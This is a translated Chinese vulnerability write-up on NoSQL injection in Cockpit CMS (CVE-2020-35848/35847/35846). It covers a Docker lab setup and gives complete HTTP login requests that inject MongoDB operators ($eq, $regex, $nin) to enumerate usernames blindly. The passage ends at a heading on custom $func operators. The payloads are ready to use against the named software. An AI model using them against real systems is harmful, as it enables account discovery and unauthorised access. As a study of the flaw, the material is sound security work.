# CockpitCMS NoSQL注入漏洞分析
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
在网络攻击方法中，SQL注入一直是最流行的攻击之一，随着NoSQL数据库，如MongoDB、Redis的出现，传统的SQL注入不再可行。但是这并不意味着NoSQL数据库就百分百安全。NoSQL注入漏洞第一次由Diaspora在2010年发现，到现在，NoSQL注入和SQL注入一样，如果开发者不注重，同样会对企业服务器造成致命威胁。
这次，根据PHP CMS Cockpit中存在的几个漏洞，来学习NoSQL
Injection。这几个漏洞被分配了3个CVE，分别是CVE-2020-35848、CVE-2020-35847和CVE-2020-35846。
从这个例子中，我们可以看到一个简单的NoSQL注入是如何一步步得到管理员权限，最后造成RCE严重后果的。
## 环境搭建
直接使用docker搭建，推荐cockpit自带的dockerfile：
    FROM php:7.3-apache
    RUN apt-get update \
        && apt-get install -y \
            wget zip unzip \
            libzip-dev \
            libfreetype6-dev \
            libjpeg62-turbo-dev \
            libpng-dev \
            sqlite3 libsqlite3-dev \
            libssl-dev \
        && pecl install mongodb \
        && pecl install redis \
        && docker-php-ext-configure gd --with-freetype-dir=/usr/include/ --with-jpeg-dir=/usr/include/ \
        && docker-php-ext-install -j$(nproc) iconv gd pdo zip opcache pdo_sqlite \
        && a2enmod rewrite expires
    RUN echo "extension=mongodb.so" > /usr/local/etc/php/conf.d/mongodb.ini
    RUN echo "extension=redis.so" > /usr/local/etc/php/conf.d/redis.ini
    RUN chown -R www-data:www-data /var/www/html
    VOLUME /var/www/html
    CMD ["apache2-foreground"]
上面的dockerfile文件会搭建一个支持nosql数据库的httpd服务。但cockpit CMS还没有安装。需要进入docker
exec进入容器内部自行下载安装。
然后访问 http://your-ip:8000/cockpit/install/index.php
，先进行自动安装。初始密码为`admin/admin`。
安装完成后访问 http://your-ip:8000/cockpit/index.php 页面即可登录。
## 漏洞1：/auth/check
打开burp，在登录页面抓个包，尝试下面的payload：
    POST /cockpit/auth/check HTTP/1.1
    Host: 
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    X-Requested-With: XMLHttpRequest
    Content-Type: application/json; charset=UTF-8
    Content-Length: 168
    Connection: close
    {
        "auth":{
            "user":{
                "$eq": "admin"
            },
            "password":[
                0
            ]
        },
        "csfr":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"
    }
我们查看相对应的源码`modules/Cockpit/module/auth.php`，可以看到：
我们可以看到，在`modules/Cockpit/module/auth.php`文件的第33行，首先，程序会查找用户是否存在用户是否存在，只有在用户存在的情况下，才会执行第35行if条件句中的`password_verify()`逻辑（`&&`运算符是短路求值，或者说是惰性求值）。所以如果返回的结果是
**password_verify() expects parameter 1 to be string** ，则说明，`$user =
admin`在数据库中是存在的，`$app->storage->findOne()`成功返回了查询结果。
而上述漏洞的关键点在于，`$filter['user']`从`$data['user']`获取到之后，在被传入`$app->storage->findOne`进行数据库查询之前，完全没有经过过滤。因此，我们可以通过MongoDB操作符来进行NoSQL
注入。
在这里，我们可以总结一些可用的MongoDB操作符注入姿势。
###  $eq
`$eq`表示equal。是MongoDB中的比较操作符。
语法：
    {
        : { $eq:  }
    }
###  $regex
`$regex`是MongoDB的正则表达式操作符，用来设置匹配字符串的正则表达式。`$regex`操作符是在MongoDB盲注中最经常被使用的，我们可以借助它来一个一个字符地爆破数据库。
语法：
    {
        : { $regex: /pattern/, $options: '' } 
    }
    {
        : { $regex: 'pattern', $options: '' }
    }
    {
        : { $regex: /pattern/}
    }
其中``是模式修正符，在MongoDB中包含`i`，`m`，`x`和`s`四个选项。
我们可以用`$regex`进行盲注，来猜测用户名，比如：
    POST /cockpit/auth/check HTTP/1.1
    Host: 
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    X-Requested-With: XMLHttpRequest
    Content-Type: application/json; charset=UTF-8
    Content-Length: 169
    Connection: close
    {
        "auth":{
            "user":{
                "$regex": "a.*"
            },
            "password":[
                0
            ]
        },
        "csfr":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"
    }
说明用户名以`a`开头的用户存在。
`"$regex": "ab.*"`：
以`ab`开头的用户不存在，那返回的信息自然是 **User not found** 。
###  $nin
`$nin`表示查询时不匹配数组中的值，语法：
    {
        field: { $nin: [ , , ...,  ] }
    }
比如现在后台一共有4个用户：
如果我们已经知道了用户admin，Poseidon和Sirens，那么我们还可以用`$nin`来加快盲注暴力破解的速度。
payload：
    {
        "auth":{
            "user":{
                "$nin": [
                    "admin",
                    "Poseidon",
                    "Sirens"
                ],
                "$regex": "Co.*"
            },
            "password":[
                0
            ]
        },
        "csfr":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"
    }
再查找以`a`，`P`或是`S`开头的用户就会提示用户不存在。
###  自定义$func/$fn/$f 操作符